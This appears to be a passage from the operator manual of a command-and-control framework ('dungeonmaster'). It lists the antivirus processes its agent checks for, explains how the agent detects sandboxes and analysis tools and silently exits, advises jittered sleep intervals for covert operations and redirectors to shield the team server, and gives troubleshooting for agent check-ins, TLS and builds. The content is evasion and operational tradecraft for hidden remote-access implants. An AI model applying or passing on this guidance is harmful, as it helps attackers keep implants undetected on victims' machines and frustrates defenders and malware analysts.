**AV processes checked:** Windows Defender (`msmpeng.exe`, `mpcmdrun.exe`), Kaspersky (`avp.exe`, `ksde.exe`), BitDefender (`bdagent.exe`, `bdwtxag.exe`), ESET (`ekrn.exe`, `egui.exe`), Malwarebytes (`malwarebytes.exe`, `mbam.exe`), Avast (`avastsvc.exe`, `avastui.exe`), AVG (`avgsvc.exe`, `avgui.exe`), McAfee (`mcshield.exe`, `mfefire.exe`), Sophos (`savservice.exe`), Trend Micro (`tmbmsrv.exe`, `ntrtscan.exe`).

### What NOT to do

**Do not run the agent in a VM or sandbox without `DM_NO_EVASION=true`.** The process count and uptime checks fire frequently in snapshot-restored environments. Build with `DM_NO_EVASION=true` for lab testing only.

**Do not run Wireshark or Process Hacker on the same machine as a live agent.** The analysis tool check will detect them and trigger a silent exit, raising an `EVASION_DETECTED` event in the campaign feed.

**Do not set sleep to 0 or 1 second.** High-frequency polling creates distinctive network patterns. Minimum recommended interval for covert operations: 60 seconds with 20–30% jitter.

**Do not expose the UI (port 3000/8080) to the internet.** Restrict to a VPN or allow-listed IP.

**Do not point agents directly at the team server IP in production.** Use a redirector. If the redirector is burned, replace it — the team server stays clean.

---

## 8. Troubleshooting

### Agent not checking in

The session does not appear in the UI after deploying the agent.

1. **Evasion checks fired.** If running in a VM, sandbox, or snapshot with <30 processes, the agent exits silently. Build with `DM_NO_EVASION=true` for testing.

2. **Uptime too short.** Machine booted less than 5 minutes ago. Wait 5 minutes or use `DM_NO_EVASION=true`.

3. **Sandbox username/hostname match.** If your test username or hostname contains `sandbox`, `analyst`, `test`, `virus`, `av`, or `malware`, the pre-flight check fires. Rename the account.

4. **C2 host/port mismatch.** Confirm the listener's callback host and port are reachable from the target. Test with:
   ```
   Test-NetConnection -ComputerName <C2_HOST> -Port <C2_PORT>
   ```

5. **TLS certificate rejection.** Production builds have `DM_TLS_SKIP_VERIFY=false`. If the server certificate is self-signed and the agent was built without skip-verify, the TLS handshake fails silently. Rebuild with `TLS Skip Verify` checked for lab use.

### Session shows as dead (gray dot)

The session exists but is no longer alive. The agent may still be running.

The server marks sessions stale when they miss 5× their sleep interval without a heartbeat.

1. Confirm the agent process is still running on the target.
2. If it exists but isn't checking in, it likely hit an in-loop evasion check. Check the campaign event feed for an `EVASION_DETECTED` event.
3. If the process is gone, the agent exited. Check Windows Event Log and any EDR telemetry.

### Task timeout ("Timeout waiting for task output")

The UI polls every 2 seconds for 60 attempts (2 minutes total). If the agent is sleeping and hasn't polled within that window, the task is still queued when the UI gives up.

**The task is not lost.** It will execute on the agent's next poll. Output is stored in evidence regardless of UI timeout.

To avoid this: reduce sleep before running long tasks. Use **SLEEP [5] s ± 0 % SET** before queuing tasks that need a fast response.

### Build fails

Build status shows `failed`.

Common causes:
- **Docker socket not mounted:** The server container requires `/var/run/docker.sock`. Verify the compose file has it mounted under the `server` service.
- **Workspace volume missing:** The Dockerfile resolves from `/workspace/infra/docker/Dockerfile.agent`. The server needs `. : /workspace:ro` in its volumes.
- **Network issue pulling Rust image:** First build requires pulling `rust:1.86-alpine`. Check internet access from the server container.

### TLS errors in server logs

`c2 listener error` in server logs.

1. Verify cert files: `certs/server.crt` and `certs/server.key` must exist.
2. If missing, regenerate:
   ```
   openssl req -x509 -newkey rsa:4096 -keyout certs/server.key \
     -out certs/server.crt -days 3650 -nodes -subj "/CN=dungeonmaster"
   ```

### JWT token expired

API calls return 401 and the UI redirects to login.

The React app refreshes access tokens automatically using the stored refresh token. If that fails, log out and log back in. If the server's JWT secret was rotated (`.env` changed + server restarted), all existing tokens are invalidated — all operators must re-authenticate.
